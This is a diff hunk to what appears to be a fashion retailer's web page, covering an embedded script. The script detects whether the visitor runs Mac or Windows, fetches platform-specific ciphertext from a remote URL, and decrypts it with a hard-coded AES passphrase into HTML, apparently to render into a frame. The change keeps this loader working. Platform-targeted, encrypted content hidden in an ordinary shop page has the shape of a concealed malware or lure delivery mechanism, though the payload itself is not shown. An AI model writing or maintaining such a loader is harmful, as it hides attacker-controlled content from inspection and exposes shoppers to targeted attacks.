@@ -503,13 +503,13 @@ Delivering the latest fashion across Japan.
     function detectPlatform() {
       const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
                 navigator.platform || navigator.userAgent || "";
-      return /mac/i.test(p) ? "mac.json" : "win.json";
+      return /mac/i.test(p) ? "mac" : "win";
     }
 
     async function loadSecret() {
       const shop = document.getElementById("shop"), frame = document.getElementById("frame");
       try {
-        const res = await fetch(DATA_URL + "/" + detectPlatform());
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
         const { cipher } = await res.json();
         const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
         if (!html) throw new Error("Decrypt failed — wrong key?");
